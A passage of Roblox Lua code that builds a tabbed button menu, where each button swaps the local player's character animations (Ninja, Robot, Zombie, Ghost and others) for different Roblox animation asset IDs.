				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Levitation.Name = "A_Levitation"
			A_Levitation.Parent = NormalTab
			A_Levitation.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Levitation.BorderSizePixel = 0
			A_Levitation.Position = UDim2.new(0, 0, 0.115472436, 0)
			A_Levitation.Size = UDim2.new(0, 150, 0, 30)
			A_Levitation.Font = Enum.Font.SciFi
			A_Levitation.Text = "Levitation"
			A_Levitation.TextColor3 = Color3.new(1, 1, 1)
			A_Levitation.TextSize = 20
			A_Levitation.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Mage.Name = "A_Mage"
			A_Mage.Parent = NormalTab
			A_Mage.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Mage.BorderSizePixel = 0
			A_Mage.Position = UDim2.new(0, 0, 0.696203232, 0)
			A_Mage.Size = UDim2.new(0, 150, 0, 30)
			A_Mage.Font = Enum.Font.SciFi
			A_Mage.Text = "Mage"
			A_Mage.TextColor3 = Color3.new(1, 1, 1)
			A_Mage.TextSize = 20
			A_Mage.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Ninja.Name = "A_Ninja"
			A_Ninja.Parent = NormalTab
			A_Ninja.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Ninja.BorderSizePixel = 0
			A_Ninja.Position = UDim2.new(0, 0, 0.0597896464, 0)
			A_Ninja.Size = UDim2.new(0, 150, 0, 30)
			A_Ninja.Font = Enum.Font.SciFi
			A_Ninja.Text = "Ninja"
			A_Ninja.TextColor3 = Color3.new(1, 1, 1)
			A_Ninja.TextSize = 20
			A_Ninja.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Pirate.Name = "A_Pirate"
			A_Pirate.Parent = NormalTab
			A_Pirate.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Pirate.BorderSizePixel = 0
			A_Pirate.Position = UDim2.new(-0.000333309174, 0, 0.874588311, 0)
			A_Pirate.Size = UDim2.new(0, 150, 0, 30)
			A_Pirate.Font = Enum.Font.SciFi
			A_Pirate.Text = "Pirate"
			A_Pirate.TextColor3 = Color3.new(1, 1, 1)
			A_Pirate.TextSize = 20
			A_Pirate.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Robot.Name = "A_Robot"
			A_Robot.Parent = NormalTab
			A_Robot.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Robot.BorderSizePixel = 0
			A_Robot.Position = UDim2.new(0, 0, 0.291479498, 0)
			A_Robot.Size = UDim2.new(0, 150, 0, 30)
			A_Robot.Font = Enum.Font.SciFi
			A_Robot.Text = "Robot"
			A_Robot.TextColor3 = Color3.new(1, 1, 1)
			A_Robot.TextSize = 20
			A_Robot.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Stylish.Name = "A_Stylish"
			A_Stylish.Parent = NormalTab
			A_Stylish.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Stylish.BorderSizePixel = 0
			A_Stylish.Position = UDim2.new(0, 0, 0.232816339, 0)
			A_Stylish.Size = UDim2.new(0, 150, 0, 30)
			A_Stylish.Font = Enum.Font.SciFi
			A_Stylish.Text = "Stylish"
			A_Stylish.TextColor3 = Color3.new(1, 1, 1)
			A_Stylish.TextSize = 20
			A_Stylish.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_SuperHero.Name = "A_SuperHero"
			A_SuperHero.Parent = NormalTab
			A_SuperHero.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_SuperHero.BorderSizePixel = 0
			A_SuperHero.Position = UDim2.new(0, 0, 0.464919746, 0)
			A_SuperHero.Size = UDim2.new(0, 150, 0, 30)
			A_SuperHero.Font = Enum.Font.SciFi
			A_SuperHero.Text = "SuperHero"
			A_SuperHero.TextColor3 = Color3.new(1, 1, 1)
			A_SuperHero.TextSize = 20
			A_SuperHero.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Toy.Name = "A_Toy"
			A_Toy.Parent = NormalTab
			A_Toy.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Toy.BorderSizePixel = 0
			A_Toy.Position = UDim2.new(6.51925802e-09, 0, 0.756028414, 0)
			A_Toy.Size = UDim2.new(0, 150, 0, 30)
			A_Toy.Font = Enum.Font.SciFi
			A_Toy.Text = "Toy"
			A_Toy.TextColor3 = Color3.new(1, 1, 1)
			A_Toy.TextSize = 20
			A_Toy.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Vampire.Name = "A_Vampire"
			A_Vampire.Parent = NormalTab
			A_Vampire.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Vampire.BorderSizePixel = 0
			A_Vampire.Position = UDim2.new(0, 0, 0.934021354, 0)
			A_Vampire.Size = UDim2.new(0, 150, 0, 30)
			A_Vampire.Font = Enum.Font.SciFi
			A_Vampire.Text = "Vampire"
			A_Vampire.TextColor3 = Color3.new(1, 1, 1)
			A_Vampire.TextSize = 20
			A_Vampire.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Werewolf.Name = "A_Werewolf"
			A_Werewolf.Parent = NormalTab
			A_Werewolf.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Werewolf.BorderSizePixel = 0
			A_Werewolf.Position = UDim2.new(-0.000333368778, 0, 0.174509808, 0)
			A_Werewolf.Size = UDim2.new(0, 150, 0, 30)
			A_Werewolf.Font = Enum.Font.SciFi
			A_Werewolf.Text = "Werewolf"
			A_Werewolf.TextColor3 = Color3.new(1, 1, 1)
			A_Werewolf.TextSize = 20
			A_Werewolf.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Zombie.Name = "A_Zombie"
			A_Zombie.Parent = NormalTab
			A_Zombie.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Zombie.BorderSizePixel = 0
			A_Zombie.Position = UDim2.new(-1.1920929e-07, 0, 0.582352936, 0)
			A_Zombie.Size = UDim2.new(0, 150, 0, 30)
			A_Zombie.Font = Enum.Font.SciFi
			A_Zombie.Text = "Zombie"
			A_Zombie.TextColor3 = Color3.new(1, 1, 1)
			A_Zombie.TextSize = 20
			A_Zombie.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Category.Name = "Category"
			Category.Parent = NormalTab
			Category.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category.BorderSizePixel = 0
			Category.Size = UDim2.new(0, 150, 0, 30)
			Category.Text = "Normal"
			Category.TextColor3 = Color3.new(0, 0.835294, 1)
			Category.TextSize = 14

			SpecialTab.Name = "SpecialTab"
			SpecialTab.Parent = Main
			SpecialTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			SpecialTab.BackgroundTransparency = 1
			SpecialTab.BorderSizePixel = 0
			SpecialTab.Position = UDim2.new(0, 0, 0.119999997, 0)
			SpecialTab.Size = UDim2.new(0, 150, 0, 230)

			A_Patrol.Name = "A_Patrol"
			A_Patrol.Parent = SpecialTab
			A_Patrol.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Patrol.BorderSizePixel = 0
			A_Patrol.Position = UDim2.new(0, 0, 0.259960413, 0)
			A_Patrol.Size = UDim2.new(0, 150, 0, 30)
			A_Patrol.Font = Enum.Font.SciFi
			A_Patrol.Text = "Patrol"
			A_Patrol.TextColor3 = Color3.new(1, 1, 1)
			A_Patrol.TextSize = 20
			A_Patrol.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Confident.Name = "A_Confident"
			A_Confident.Parent = SpecialTab
			A_Confident.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Confident.BorderSizePixel = 0
			A_Confident.Position = UDim2.new(0, 0, 0.389248967, 0)
			A_Confident.Size = UDim2.new(0, 150, 0, 30)
			A_Confident.Font = Enum.Font.SciFi
			A_Confident.Text = "Confident"
			A_Confident.TextColor3 = Color3.new(1, 1, 1)
			A_Confident.TextSize = 20
			A_Confident.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Popstar.Name = "A_Popstar"
			A_Popstar.Parent = SpecialTab
			A_Popstar.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Popstar.BorderSizePixel = 0
			A_Popstar.Position = UDim2.new(0, 0, 0.130671918, 0)
			A_Popstar.Size = UDim2.new(0, 150, 0, 30)
			A_Popstar.Font = Enum.Font.SciFi
			A_Popstar.Text = "Popstar"
			A_Popstar.TextColor3 = Color3.new(1, 1, 1)
			A_Popstar.TextSize = 20
			A_Popstar.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Cowboy.Name = "A_Cowboy"
			A_Cowboy.Parent = SpecialTab
			A_Cowboy.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Cowboy.BorderSizePixel = 0
			A_Cowboy.Position = UDim2.new(0, 0, 0.772964239, 0)
			A_Cowboy.Size = UDim2.new(0, 150, 0, 30)
			A_Cowboy.Font = Enum.Font.SciFi
			A_Cowboy.Text = "Cowboy"
			A_Cowboy.TextColor3 = Color3.new(1, 1, 1)
			A_Cowboy.TextSize = 20
			A_Cowboy.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Ghost.Name = "A_Ghost"
			A_Ghost.Parent = SpecialTab
			A_Ghost.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Ghost.BorderSizePixel = 0
			A_Ghost.Position = UDim2.new(0, 0, 0.900632322, 0)
			A_Ghost.Size = UDim2.new(0, 150, 0, 30)
			A_Ghost.Font = Enum.Font.SciFi
			A_Ghost.Text = "Ghost"
			A_Ghost.TextColor3 = Color3.new(1, 1, 1)
			A_Ghost.TextSize = 20
			A_Ghost.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616012453"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616011509"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Sneaky.Name = "A_Sneaky"
			A_Sneaky.Parent = SpecialTab
			A_Sneaky.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Sneaky.BorderSizePixel = 0
			A_Sneaky.Position = UDim2.new(0, 0, 0.517628431, 0)
			A_Sneaky.Size = UDim2.new(0, 150, 0, 30)
			A_Sneaky.Font = Enum.Font.SciFi
			A_Sneaky.Text = "Sneaky"
			A_Sneaky.TextColor3 = Color3.new(1, 1, 1)
			A_Sneaky.TextSize = 20
			A_Sneaky.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Princess.Name = "A_Princess"
			A_Princess.Parent = SpecialTab
			A_Princess.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Princess.BorderSizePixel = 0
			A_Princess.Position = UDim2.new(0, 0, 0.645296335, 0)
			A_Princess.Size = UDim2.new(0, 150, 0, 30)
			A_Princess.Font = Enum.Font.SciFi
			A_Princess.Text = "Princess"
			A_Princess.TextColor3 = Color3.new(1, 1, 1)
			A_Princess.TextSize = 20
			A_Princess.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Category_2.Name = "Category"
			Category_2.Parent = SpecialTab
			Category_2.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category_2.BorderSizePixel = 0
			Category_2.Size = UDim2.new(0, 150, 0, 30)
			Category_2.Text = "Special"
			Category_2.TextColor3 = Color3.new(0, 0.835294, 1)
			Category_2.TextSize = 14

			OtherTab.Name = "OtherTab"
			OtherTab.Parent = Main
			OtherTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			OtherTab.BackgroundTransparency = 1
			OtherTab.BorderSizePixel = 0
			OtherTab.Position = UDim2.new(0, 0, 1.06800008, 0)
			OtherTab.Size = UDim2.new(0, 150, 0, 220)

			Category_3.Name = "Category"
			Category_3.Parent = OtherTab
			Category_3.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category_3.BorderSizePixel = 0
			Category_3.Size = UDim2.new(0, 150, 0, 30)
			Category_3.Text = "Other"
			Category_3.TextColor3 = Color3.new(0, 0.835294, 1)
			Category_3.TextSize = 14

			A_None.Name = "A_None"
			A_None.Parent = OtherTab
			A_None.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_None.BorderSizePixel = 0
			A_None.Position = UDim2.new(0, 0, 0.134545445, 0)
			A_None.Size = UDim2.new(0, 150, 0, 30)
			A_None.Font = Enum.Font.SciFi
			A_None.Text = "None"
			A_None.TextColor3 = Color3.new(1, 1, 1)
			A_None.TextSize = 20
			A_None.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Anthro.Name = "A_Anthro"
			A_Anthro.Parent = OtherTab
			A_Anthro.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Anthro.BorderSizePixel = 0
			A_Anthro.Position = UDim2.new(0, 0, 0.269090891, 0)
			A_Anthro.Size = UDim2.new(0, 150, 0, 30)
			A_Anthro.Font = Enum.Font.SciFi
